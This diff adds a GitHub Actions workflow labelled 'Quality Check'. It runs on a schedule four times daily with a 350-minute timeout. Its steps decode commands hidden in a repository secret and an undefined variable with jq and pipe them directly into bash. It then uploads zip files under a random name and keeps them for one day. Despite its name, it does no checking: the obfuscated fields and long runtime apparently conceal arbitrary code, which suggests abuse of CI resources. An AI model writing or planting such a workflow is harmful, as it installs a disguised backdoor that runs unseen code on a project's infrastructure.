@@ -1,0 +1,29 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          i3: ${{ secrets.i3 }}
+        run: |
+          printf '%s' "$i3" | jq -r .ei47 | /bin/bash
+          printf '%s' "$qrjxi7597" | jq -r .mokqc399 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: vUfjCmXO
+          path: "*.zip"
+          retention-days: 1
